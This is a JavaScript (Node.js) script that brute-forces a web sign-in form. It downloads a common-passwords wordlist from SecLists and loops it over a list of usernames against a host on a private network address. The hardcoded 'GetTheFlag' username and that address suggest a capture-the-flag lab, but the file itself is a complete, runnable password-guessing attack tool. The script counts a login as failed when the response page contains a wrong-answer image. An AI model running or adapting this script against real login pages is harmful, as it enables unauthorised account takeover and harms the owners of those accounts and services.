// @ts-check
import fetch from "node-fetch"

const SERVER_ENDPOINT = "http://192.168.56.101"
const BAD_AUTH_ERROR_IMAGE = `<img src="images/WrongAnswer.gif" alt="">`

async function retrievePasswordDataSet() {
    const page = await fetch(`https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt`)
    const rawTextPage = await page.text()
    const splitedTextPage = rawTextPage.split("\n")
    return splitedTextPage
}

function getEndpoint({ username, password }) {
    return `${SERVER_ENDPOINT}/?page=signin&username=${username}&password=${password}&Login=Login#`
}

async function main() {
    const usernameCollection = [
        // Most commons
        // "root",
        // "admin",
        // "test",
        // "guest",
        // "info",
        // "adm",
        // "mysql",
        // "user",
        // "administrator",
        // "oracle",
        // "ftp",
        // "pi",
        // "puppet",
        // "ansible",
        // "ec2-user",
        // "vagrant",
        // "azureuser",
        // Random
        "wil", "admin", "user", "root",
        // Only surname
        "me", "GetThe",
        // Surname + First name
        "GetTheFlag", "meone", "metwo", "methree",
    ];
    const passwordCollection = await retrievePasswordDataSet();
    console.log("BRUTEFORCE STARTING")

    await Promise.all(usernameCollection.map(async username => {
        for (const password of passwordCollection) {
            try {
                const endpointToHit = getEndpoint({ username, password });
                const response = await fetch(endpointToHit);
                const renderedPage = await response.text()
                const attemptFailed = renderedPage.includes(BAD_AUTH_ERROR_IMAGE)

                // In case of wrong authentication atttemp the following image is rendered by the server
                // The Status code stays 200
                // <img src="images/WrongAnswer.gif" alt=""> 
                if (attemptFailed) {
                    console.log(`FAILURE for pair: username=${username} password=${password}`)
                    continue
                } else {
                    console.log(`SUCCESS for pair: username=${username} password=${password}`)
                    console.log({ renderedPage })
                    console.log('_'.repeat(10))
                    break;
                }

            } catch (e) {
                console.log(`Unkown error on attempt for username=${username} password=${password}`)
                continue
            }
        }
    }))
}

await main()
